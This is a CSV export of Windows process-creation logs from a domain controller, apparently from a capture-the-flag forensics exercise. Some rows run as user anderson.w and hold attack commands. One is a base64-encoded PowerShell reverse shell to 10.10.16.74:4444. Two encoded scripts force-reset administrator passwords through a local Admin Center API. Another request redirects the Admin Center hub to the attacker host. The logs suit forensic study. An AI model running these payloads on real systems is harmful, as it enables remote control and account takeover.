"TimeGenerated","Computer","User","Image","CommandLine","ParentImage","ParentCommandLine","ProcessGuid","ParentProcessGuid"
"11/8/2026, 1:04:37.886782 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1de5-6a7b-0f07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:03:37.886359 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1da9-6a7b-0907-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:02:37.889708 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1d6d-6a7b-0207-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:01:44.893648 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1d38-6a7b-f506-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:01:37.88777 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1d31-6a7b-f106-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:00:41.586918 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-1cf9-6a7b-ed06-000000003200","7e3eed90-1c9e-6a7b-dc06-000000003200"
"11/8/2026, 1:00:41.294475 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1cf9-6a7b-eb06-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:00:37.899666 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1cf5-6a7b-e706-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:59:37.88594 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1cb9-6a7b-e006-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:59:10.699152 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -c ""Invoke-WebRequest -Uri http://localhost:17017/api/v1/settings/sysadmin/connect-to-hub -Method Post -Body (@{hubAddress=\"" ""http://10.10.16.74:8082\;oneTimePassword=\x\;nodeName=\x\}|ConvertTo-Json) -ContentType application/json -UseBasicParsing""","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-1c9e-6a7b-dd06-000000003200","7e3eed90-1c9e-6a7b-dc06-000000003200"
"11/8/2026, 12:59:10.052482 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1c9e-6a7b-da06-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:58:37.886357 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1c7d-6a7b-d506-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:57:37.887837 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1c41-6a7b-cd06-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:56:37.885106 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1c05-6a7b-c506-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:55:48.028064 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1bd4-6a7b-c006-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:55:37.886531 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1bc9-6a7b-bc06-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:54:49.570516 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1b99-6a7b-b806-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:54:37.88602 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1b8d-6a7b-b406-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:53:37.887811 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1b51-6a7b-ae06-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:53:34.119667 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABuAGEAbQBlAHMAIAA9ACAAQAAoACIAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAiACwAIgBhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACIALAAiAHMAeQBzAGEAZABtAGkAbgAiACwAIgBTAHkAcwBBAGQAbQBpAG4AIgAsACIAcgBvAG8AdAAiACwAIgBwAG8AcwB0AG0AYQBzAHQAZQByACIALAAiAG0AYQBpAGwAYQBkAG0AaQBuACIALAAiAHMAbQBhAHIAdABlAHIAbQBhAGkAbAAiACwAIgBzAHkAcwB0AGUAbQAiACkACgAkAG8AdQB0ACAAPQAgAEAAKAApAAoAZgBvAHIAZQBhAGMAaAAgACgAJAB1ACAAaQBuACAAJABuAGEAbQBlAHMAKQAgAHsACgAgACAAIAAgACQAYgBvAGQAeQAgAD0AIABAAHsASQBzAFMAeQBzAEEAZABtAGkAbgA9ACIAdAByAHUAZQAiADsATwBsAGQAUABhAHMAcwB3AG8AcgBkAD0AIgB3AGgAYQB0AGUAdgBlAHIAIgA7AFUAcwBlAHIAbgBhAG0AZQA9ACQAdQA7AE4AZQB3AFAAYQBzAHMAdwBvAHIAZAA9ACIAUABAAHMAcwB3ADAAcgBkADEAMgAzACEAQAAjACIAOwBDAG8AbgBmAGkAcgBtAFAAYQBzAHMAdwBvAHIAZAA9ACIAUABAAHMAcwB3ADAAcgBkADEAMgAzACEAQAAjACIAfQAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4ACgAgACAAIAAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADEANwAwADEANwAvAGEAcABpAC8AdgAxAC8AYQB1AHQAaAAvAGYAbwByAGMAZQAtAHIAZQBzAGUAdAAtAHAAYQBzAHMAdwBvAHIAZAAiACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAkAGIAbwBkAHkAIAAtAEMAbwBuAHQAZQBuAHQAVAB5AHAAZQAgACIAYQBwAHAAbABpAGMAYQB0AGkAbwBuAC8AagBzAG8AbgAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0ACAAKwA9ACAAIgAkAHUAIAA6ACAAUwBUAEEAVABVAFMAXwBPAEsAIAAkACgAJAByAC4AQwBvAG4AdABlAG4AdAApACIACgAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAZQByAHIATQBzAGcAIAA9ACAAJABfAC4ARQByAHIAbwByAEQAZQB0AGEAaQBsAHMALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACQAbwB1AHQAIAArAD0AIAAiACQAdQAgADoAIABFAFIAUgAgACQAZQByAHIATQBzAGcAIgAKACAAIAAgACAAfQAKAH0ACgAkAG8AdQB0ACAALQBqAG8AaQBuACAAIgBgAHIAYABuACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAALQBGAGkAbABlAFAAYQB0AGgAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHMAbQByAGUAcwAzAC4AdAB4AHQAIAAtAEUAbgBjAG8AZABpAG4AZwAgAGEAcwBjAGkAaQAgAC0ARgBvAHIAYwBlAAoA","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-1b4e-6a7b-ac06-000000003200","7e3eed90-1a71-6a7b-8506-000000003200"
"11/8/2026, 12:53:33.904564 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1b4d-6a7b-aa06-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:52:37.897054 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1b15-6a7b-a306-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:52:33.01255 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1b11-6a7b-a106-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:52:00.77534 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1af0-6a7b-9e06-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:51:37.889121 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1ad9-6a7b-9206-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:51:01.564861 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABiAG8AZAB5ACAAPQAgAEAAewBJAHMAUwB5AHMAQQBkAG0AaQBuAD0AIgB0AHIAdQBlACIAOwBPAGwAZABQAGEAcwBzAHcAbwByAGQAPQAiAHcAaABhAHQAZQB2AGUAcgAiADsAVQBzAGUAcgBuAGEAbQBlAD0AIgBhAGQAbQBpAG4AIgA7AE4AZQB3AFAAYQBzAHMAdwBvAHIAZAA9ACIAUABAAHMAcwB3ADAAcgBkADEAMgAzACEAQAAjACIAOwBDAG8AbgBmAGkAcgBtAFAAYQBzAHMAdwBvAHIAZAA9ACIAUABAAHMAcwB3ADAAcgBkADEAMgAzACEAQAAjACIAfQAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4ACgB0AHIAeQAgAHsACgAgACAAIAAgACQAcgAgAD0AIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvAGwAbwBjAGEAbABoAG8AcwB0ADoAMQA3ADAAMQA3AC8AYQBwAGkALwB2ADEALwBhAHUAdABoAC8AZgBvAHIAYwBlAC0AcgBlAHMAZQB0AC0AcABhAHMAcwB3AG8AcgBkACIAIAAtAE0AZQB0AGgAbwBkACAAUABvAHMAdAAgAC0AQgBvAGQAeQAgACQAYgBvAGQAeQAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgBhAHAAcABsAGkAYwBhAHQAaQBvAG4ALwBqAHMAbwBuACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAAoAIAAgACAAIAAiAFMAVABBAFQAVQBTADoAJAAoACQAcgAuAFMAdABhAHQAdQBzAEMAbwBkAGUAKQBgAG4AQgBPAEQAWQA6ACQAKAAkAHIALgBDAG8AbgB0AGUAbgB0ACkAIgAgAHwAIABPAHUAdAAtAEYAaQBsAGUAIAAtAEYAaQBsAGUAUABhAHQAaAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwBtAHIAZQBzADIALgB0AHgAdAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAYQBzAGMAaQBpACAALQBGAG8AcgBjAGUACgB9ACAAYwBhAHQAYwBoACAAewAKACAAIAAgACAAJABlAHIAcgBNAHMAZwAgAD0AIAAkAF8ALgBFAHIAcgBvAHIARABlAHQAYQBpAGwAcwAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACIAUwBUAEEAVABVAFMAOgBFAFIAUgBgAG4AQgBPAEQAWQA6ACQAZQByAHIATQBzAGcAIgAgAHwAIABPAHUAdAAtAEYAaQBsAGUAIAAtAEYAaQBsAGUAUABhAHQAaAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwBtAHIAZQBzADIALgB0AHgAdAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAYQBzAGMAaQBpACAALQBGAG8AcgBjAGUACgB9AAoA","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-1ab5-6a7b-8f06-000000003200","7e3eed90-1a71-6a7b-8506-000000003200"
"11/8/2026, 12:51:01.354168 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1ab5-6a7b-8d06-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:50:37.886826 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1a9d-6a7b-8806-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:49:37.892118 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1a61-6a7b-8106-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:49:37.543542 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1a61-6a7b-7f06-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:48:37.886026 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1a25-6a7b-7906-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:47:47.833466 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-19f3-6a7b-6f06-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:47:37.88866 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-19e9-6a7b-6b06-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:47:16.346015 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-19d4-6a7b-6806-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
